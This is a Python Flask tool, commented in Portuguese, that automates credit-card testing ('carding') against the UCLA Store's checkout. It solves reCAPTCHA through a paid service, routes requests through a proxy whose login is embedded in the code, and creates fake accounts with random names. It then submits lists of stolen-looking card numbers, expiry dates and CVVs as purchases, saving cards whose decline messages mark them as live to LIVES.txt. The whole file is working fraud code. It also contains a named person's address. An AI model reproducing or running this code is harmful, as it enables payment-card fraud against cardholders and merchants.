from flask import Flask, render_template, request, jsonify
import requests
import json
import time
import random
import string
import traceback
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from threading import Thread

app = Flask(__name__)

# Configuração de retry e proxy
retry_strategy = Retry(
    total=5,
    backoff_factor=1,
    status_forcelist=[429, 500, 502, 503, 504],
    allowed_methods=["HEAD", "GET", "POST"]
)

adapter = HTTPAdapter(max_retries=retry_strategy)

proxy = {
    'http': 'http://zone-FEC3794A-country-us:813B44EB5CCD4FB5B4CA2394F4EBC6F7@proxy.bytio.com:8080',
    'https': 'http://zone-FEC3794A-country-us:813B44EB5CCD4FB5B4CA2394F4EBC6F7@proxy.bytio.com:8080',
}



# Variáveis globais para armazenar os resultados
logs_aprovados = []
logs_reprovados = []

def solve_captcha(site_key, page_url, api_key):
    payload = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': page_url,
            'websiteKey': site_key,
        }
    }
    response = requests.post("https://api.capmonster.cloud/createTask", json=payload)
    response_data = response.json()

    if response_data['errorId'] == 0:
        task_id = response_data['taskId']
        timeout = time.time() + 240

        while time.time() < timeout:
            time.sleep(5)
            result_response = requests.post("https://api.capmonster.cloud/getTaskResult", json={"clientKey": api_key, "taskId": task_id})
            result_data = result_response.json()

            if result_data['status'] == "ready":
                return result_data['solution']['gRecaptchaResponse']
            elif result_data['errorId'] != 0:
                return None
    return None

def gerar_nome_aleatorio():
    nomes = ["Ana", "Bruno", "Carlos", "Diana", "Eduardo", "Fabiana", "Gustavo", "Helena", "Isabel", "João"]
    sobrenomes = ["Silva", "Souza", "Oliveira", "Santos", "Pereira", "Costa", "Fernandes", "Gomes", "Martins", "Almeida"]
    return random.choice(nomes), random.choice(sobrenomes)

def gerar_email_aleatorio():
    dominios = ["gmail.com", "yahoo.com", "hotmail.com"]
    prefixo = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    dominio = random.choice(dominios)
    return f"{prefixo}@{dominio}"

def login(session, timeout):
    api_key = "CHAVE CAP MONSTER"
    site_key = "6LeUQKkdAAAAAOA72Rs7MRy8vojHNNYh5pGbbzq0"
    page_url = "https://www.uclastore.com/sca-dev-2022-2-0/services/Account.Register.Service.ss?c=5803383&n=2"
    cap = solve_captcha(site_key, page_url, api_key)

    firstname, lastname = gerar_nome_aleatorio()
    email = gerar_email_aleatorio()
    data = {
        "firstname": firstname,
        "lastname": lastname,
        "email": email,
        "password": "Renesmee01",
        "password2": "Renesmee01",
        "school": "",
        "identifiertype": "",
        "identifier": "",
        "redirect": "True",
        "emailsubscribe": "T",
        "g-recaptcha-response": cap
    }
    
    response = session.post(page_url, json=data, timeout=timeout)
    jsessionid = session.cookies.get('JSESSIONID')
    cookie = f"JSESSIONID={jsessionid}"

    return cookie, response.text

def adicionar_endereco(session, cookie, timeout):
    url = "https://www.uclastore.com/sca-dev-2022-2-0/services/Address.Service.ss?c=5803383&n=2"
    headers = {
        "Host": "www.uclastore.com",
        "Content-Length": "3349",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
        "Content-Type": "application/json; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "X-SC-Touchpoint": "checkout",
        "sec-ch-ua-platform": '"Android"',
        "Origin": "www.uclastore.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "www.uclastore.com/sca-dev-2023-2-0/checkout.ssp?is=checkout&client_id=692929054.1724304906&session_id=1724304905",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookie
    }
    
    data = {
        "country": "US",
        "fullname": "Test User",
        "addr1": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zip": "10001",
        "phone": "(201) 1234567",
        "defaultbilling": "T",
        "defaultshipping": "T",
        "isresidential": "F"
    }
    
    response = session.post(url, headers=headers, json=data, timeout=timeout)
    return response.json()

def adicionar_item_ao_carrinho(session, cookie, timeout):

    url = "https://www.uclastore.com/sca-dev-2022-2-0/services/LiveOrder.Line.Service.ss?c=5803383&n=2"
    headers = {
        "Host": "www.uclastore.com",
        "Content-Length": "3349",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
        "Content-Type": "application/json; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "X-SC-Touchpoint": "checkout",
        "sec-ch-ua-platform": '"Android"',
        "Origin": "www.uclastore.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "www.uclastore.com/sca-dev-2023-2-0/checkout.ssp?is=checkout&client_id=692929054.1724304906&session_id=1724304905",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookie
    }
    data = [{"item":{"internalid":621882,"type":"InvtPart"},"quantity":20,"options":[{"cartOptionId":"custcol_nsts_csic_srl_num_reqd","itemOptionId":"","label":"Serial Number Required","type":"checkbox"},{"cartOptionId":"custcol_nsts_csre_rntl","itemOptionId":"","label":"Rental","type":"checkbox"},{"cartOptionId":"custcol_nsts_csmg_aca_term","itemOptionId":"","label":"Academic Term","type":"select"},{"cartOptionId":"custcol_nsts_csmg_school","itemOptionId":"","label":"School","type":"select"},{"cartOptionId":"custcol_nsts_csbb_isbn","itemOptionId":"","label":"ISBN","type":"text"},{"cartOptionId":"custcol_nsts_csre_dur","itemOptionId":"","label":"Rental Duration","type":"select"},{"cartOptionId":"custcol_nsts_csic_docs_accepted","itemOptionId":"","label":"Documents Accepted","type":"checkbox"},{"cartOptionId":"custcol_nsts_csre_rental_available","itemOptionId":"","label":"Rental Available","type":"checkbox"},{"cartOptionId":"custcol_nsts_csbb_title","itemOptionId":"","label":"Title","type":"text"},{"cartOptionId":"custcol_nsts_csbb_author","itemOptionId":"","label":"Author","type":"text"},{"cartOptionId":"custcol_nsts_csic_web_purchase_type","itemOptionId":"","label":"CS SCA Purchase Type","type":"select"},{"cartOptionId":"custcol_nsts_csic_upc","itemOptionId":"","label":"UPC","type":"text"},{"cartOptionId":"custcol_nsts_csps_line_ind","itemOptionId":"","label":"Line Indicator","type":"checkbox"},{"cartOptionId":"custcol_nsts_csdm_dm","itemOptionId":"","label":"Digital Material","type":"checkbox"},{"cartOptionId":"custcol_nsts_csdm_dmv","itemOptionId":"","label":"Digital Material Vendor","type":"select"},{"cartOptionId":"custcol_ava_udf1","itemOptionId":"","label":"UDF1","type":"text"},{"cartOptionId":"custcol_ava_item","itemOptionId":"","label":"Item","type":"text"},{"cartOptionId":"custcol_ava_incomeaccount","itemOptionId":"","label":"IncomeAccount","type":"text"},{"cartOptionId":"custcol_ava_taxcodemapping","itemOptionId":"","label":"TaxCode Mapping","type":"text"},{"cartOptionId":"custcol_ava_udf2","itemOptionId":"","label":"UDF2","type":"text"},{"cartOptionId":"custcol_ava_upccode","itemOptionId":"","label":"UPC Code","type":"text"},{"cartOptionId":"custcol_ava_pickup","itemOptionId":"","label":"Pick Up","type":"checkbox"},{"cartOptionId":"custcol_asucla_size","itemOptionId":"custitem_asucla_size","label":"Size","type":"select","value":{"internalid":"5","label":"X-LARGE"}},{"cartOptionId":"custcol_asucla_sale_order_brand","itemOptionId":"","label":"Brand","type":"text"},{"cartOptionId":"custcol_ewrfee_item_id","itemOptionId":"","label":"EWR Fee Item ID","type":"select"},{"cartOptionId":"custcol_ewrfee","itemOptionId":"","label":"EWR Fee","type":"currency"},{"cartOptionId":"custcol_ewrfeeapplicable","itemOptionId":"","label":"EWR Fee Applicable","type":"checkbox"},{"cartOptionId":"custcol_ewr_item_flag","itemOptionId":"","label":"EWR Item Flag","type":"checkbox"},{"cartOptionId":"custcol_asucla_so_online_name","itemOptionId":"","label":"Web Store Display Name","type":"text"},{"cartOptionId":"custcol_nsts_cssc_is_lms_rental","itemOptionId":"","label":"Is LMS Rental","type":"checkbox"},{"cartOptionId":"custcol_nsts_cssc_lms_api_token","itemOptionId":"","label":"LMS API Token","type":"text"},{"cartOptionId":"custcol_ava_taxamount","itemOptionId":"","label":"Tax Amount","type":"currency"}],"location":"","fulfillmentChoice":"ship","freeGift":False}]
    
    response = session.post(url, headers=headers, json=data, timeout=timeout)  # verify=False conforme preferência do usuário
    return response.json()

def process_payment(cc, mes, ano, cvv, cookie, session, timeout):
    site_key = "6LeUQKkdAAAAAOA72Rs7MRy8vojHNNYh5pGbbzq0"
    page_url = "https://www.uclastore.com"
    api_key = "CHAVE CAP MONSTER"
    
    cap = solve_captcha(site_key, page_url, api_key)

    url = "https://www.uclastore.com/sca-dev-2022-2-0/services/LiveOrder.Service.ss?cur=1&t=1725433768064&c=5803383&n=2"
    headers = {
        "Host": "www.uclastore.com",
        "Content-Length": "3349",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
        "sec-ch-ua-mobile": "?1",
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
        "Content-Type": "application/json; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "X-SC-Touchpoint": "checkout",
        "sec-ch-ua-platform": '"Android"',
        "Origin": "www.uclastore.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "www.uclastore.com/sca-dev-2023-2-0/checkout.ssp?is=checkout&client_id=692929054.1724304906&session_id=1724304905",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie": cookie
    }
    
    mes1 = int(mes)
    
    response = session.get(url)
    response_data = response.json()
    shipp = response_data.get('shipaddress', '')
    
    
    data = {
        "addresses": [{
            "zip": "73008",
            "country": "US",
            "addr2": "",
            "addr1": "Av. Eng. Eduardo Arantes e Oliveira",
            "city": "Esposende",
            "addr3": "",
            "isvalid": "T",
            "internalid": "812995",
            "phone": "(201) 649-9799",
            "defaultbilling": "T",
            "defaultshipping": "T",
            "isresidential": "F",
            "state": "OK",
            "fullname": "Jardeilson Silva de Souza",
            "company": "Jardeilson Silva de Souza"
        }],
        "shipmethods": [
      {
        "internalid": "315",
        "name": "FedEx 2 Day",
        "shipcarrier": "nonups",
        "rate": 58.11,
        "rate_formatted": "$58.11"
      },
      {
        "internalid": "3",
        "name": "FedEx First Overnight",
        "shipcarrier": "nonups",
        "rate": 186.66,
        "rate_formatted": "$186.66"
      },
      {
        "internalid": "148243",
        "name": "FedEx Home Delivery",
        "shipcarrier": "nonups",
        "rate": 21.03,
        "rate_formatted": "$21.03"
      },
      {
        "internalid": "153591",
        "name": "FedEx Next Business Day",
        "shipcarrier": "nonups",
        "rate": 132.66,
        "rate_formatted": "$132.66"
      },
      {
        "internalid": "144860",
        "name": "UPS 2nd Day Air®",
        "shipcarrier": "ups",
        "rate": 63.24,
        "rate_formatted": "$63.24"
      },
      {
        "internalid": "144861",
        "name": "UPS Next Day Air®",
        "shipcarrier": "ups",
        "rate": 161.9,
        "rate_formatted": "$161.90"
      },
      {
        "internalid": "316",
        "name": "UPS® Ground",
        "shipcarrier": "ups",
        "rate": 19.41,
        "rate_formatted": "$19.41"
      },
      {
        "internalid": "153593",
        "name": "DIY USPS Priority Mail®",
        "shipcarrier": "nonups",
        "rate": 0,
        "rate_formatted": "Free!"
      },
      {
        "internalid": "147807",
        "name": "FedEx Two Business Days",
        "shipcarrier": "nonups",
        "rate": 75.6,
        "rate_formatted": "$75.60"
      }
        ],
        "lines": [{
            "item": {"internalid": 137971, "type": "InvtPart"},
            "quantity": 1,
            "internalid": "item137971set295045",
            "options": [],
            "location": "",
            "fulfillmentChoice": "ship",
            "freeGift": False
        }],
        "paymentmethods": [{
            "type": "creditcard",
            "creditcard": {
                "ccnumber": cc,
                "ccname": " Jardeilson Silva ",
                "ccexpiredate": f"{mes1}/{ano}",
                "ccsecuritycode": cvv,
                "expmonth": mes1,
                "expyear": ano,
                "paymentmethod": {
                    "internalid": "5",
                    "creditcard": True,
                    "ispaypal": False,
                    "isexternal": False,
                    "key": "5,4,1555641112",
                    "iscardholderauthenticationsupported": "F"
                }
            }
        }],
        "internalid": None,
        "confirmation": {"addresses": [], "shipmethods": [], "lines": [], "paymentmethods": []},
        "multishipmethods": [],
        "lines_sort": ["item137971set295045"],
        "latest_addition": "item137971set295045",
        "promocodes": [],
        "ismultishipto": False,
        "shipmethod": f"84041",
        "billaddress": f"{shipp}",
        "shipaddress": f"{shipp}",
        "isPaypalComplete": False,
        "agreetermcondition": True,
        "summary": {
            "discounttotal_formatted": "$0.00",
            "taxonshipping_formatted": "$0.00",
            "taxondiscount_formatted": "$0.00",
            "itemcount": 1,
            "taxonhandling_formatted": "$0.00",
            "total": 530.4,
            "tax2total": 0,
            "discountedsubtotal": 465.5,
            "taxtotal": 0,
            "discounttotal": 0,
            "discountedsubtotal_formatted": "$465.50",
            "taxondiscount": 0,
            "handlingcost_formatted": "$0.00",
            "taxonshipping": 0,
            "taxtotal_formatted": "$0.00",
            "totalcombinedtaxes_formatted": "$0.00",
            "handlingcost": 0,
            "totalcombinedtaxes": 0,
            "giftcertapplied_formatted": "$0.00",
            "shippingcost_formatted": "$64.90",
            "discountrate": 0,
            "taxonhandling": 0,
            "tax2total_formatted": "$0.00",
            "discountrate_formatted": "$0.00",
            "estimatedshipping": 64.9,
            "subtotal": 465.5,
            "shippingcost": 64.9,
            "estimatedshipping_formatted": "$64.90",
            "total_formatted": "$530.40",
            "giftcertapplied": 0,
            "subtotal_formatted": "$465.50"
        },
        "options": {
         "custbody_nsts_csfd_trans_source": "3",
         "custbody_acs_wr_rc_response":cap
  #  "custbody_recaptcha_data": cap
        },
       # "custbody_recaptcha_data": cap,
        "purchasenumber": "",
        "sameAs": True
    }
    
    response = session.post(url, headers=headers, json=data, timeout=timeout)
    tempo = int(response.elapsed.total_seconds())
    response_data = response.json()
    
    
    
    bs = ["34", "37"]
    mensagens_a_remover = [
    "Incorrect payment information. ",
    "Transaction was declined by processor. ",
    "Processor feature not available. ",
    "Invalid card security code. ",
    "Transaction not allowed. ",
    "Insufficient Funds. ",
    "Expired card. ",
    "Transaction was rejected by gateway. ",
    
]

    message = response_data.get('errorMessage', '')

    for mensagem in mensagens_a_remover:
        message1 = message.replace(mensagem, '')
        message = message1.split(":Decline -")[0]


# Opcionalmente, você pode remover espaços extras
    message = message.strip()
    cc2 = cc[0:3]

    if "CVV" in message1 or "CVN" in message1 or "nsufficient" in message1 or "NSUFFICIENT" in message1:
        
        with open("LIVES.txt", "a") as file:  # Abre em modo de adição
            file.write(f"{cc}|{mes}|{ano}|{cvv} - {message}\n")
        logs_aprovados.append(f"Aprovado {cc}|{mes}|{ano}|{cvv}  {message1} TEMPO: {tempo}")   
    elif any(b in cc2 for b in bs) and "xpired" in message1:
        with open("LIVES.txt", "a") as file:  # Abre em modo de adição
            file.write(f"{cc}|{mes}|{ano}|{cvv} - {message}\n")
        logs_aprovados.append("Aprovado {cc}|{mes}|{ano}|{cvv}  {message1} TEMPO: {tempo}")
    elif any(b in cc2 for b in bs) and "XPIRED" in message1:
        with open("LIVES.txt", "a") as file:  # Abre em modo de adição
            file.write(f"{cc}|{mes}|{ano}|{cvv} - {message}\n")
        logs_aprovados.append("Aprovado {cc}|{mes}|{ano}|{cvv}  {message1} TEMPO: {tempo}")
    else:
        logs_reprovados.append(f"Reprovado {cc}|{mes}|{ano}|{cvv}  {message} TEMPO: {tempo}")

def process_cards(cards):
    global logs_aprovados, logs_reprovados
    timeout_duration = 300
    headers = {
            "Host": "www.uclastore.com",
            "Content-Length": "3349",
            "sec-ch-ua": '"Not)A;Brand";v="99", "Android WebView";v="127", "Chromium";v="127"',
            "sec-ch-ua-mobile": "?1",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "X-Requested-With": "XMLHttpRequest",
            "X-SC-Touchpoint": "checkout",
            "sec-ch-ua-platform": '"Android"',
            "Origin": "www.uclastore.com",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "www.uclastore.com/sca-dev-2023-2-0/checkout.ssp?is=checkout&client_id=692929054.1724304906&session_id=1724304905",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
            "Cookie": ""
        }

    session = requests.Session()
    session.headers.update(headers)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    
    cookie, _ = login(session, timeout=timeout_duration)
    adicionar_endereco(session, cookie, timeout=timeout_duration)
    adicionar_item_ao_carrinho(session, cookie, timeout=timeout_duration)
    
    for card in cards:
        cc, mes, ano, cvv = card.strip().split("|")
        process_payment(cc, mes, ano, cvv, cookie, session, timeout=timeout_duration)

# Página inicial para inserção de cartões
@app.route('/')
def index():
    return render_template('index.php')

# Rota para iniciar o processamento dos cartões
@app.route('/start', methods=['POST'])
def start():
    cards = request.form['cards'].splitlines()
    thread = Thread(target=process_cards, args=(cards,))
    thread.start()
    return jsonify({"status": "Processing started"})

# Rota para obter os logs em tempo real
@app.route('/logs')
def logs():
    return jsonify({
        "aprovados": logs_aprovados,
        "reprovados": logs_reprovados
    })

if __name__ == "__main__":
    app.run(host="localhost", port=8088)
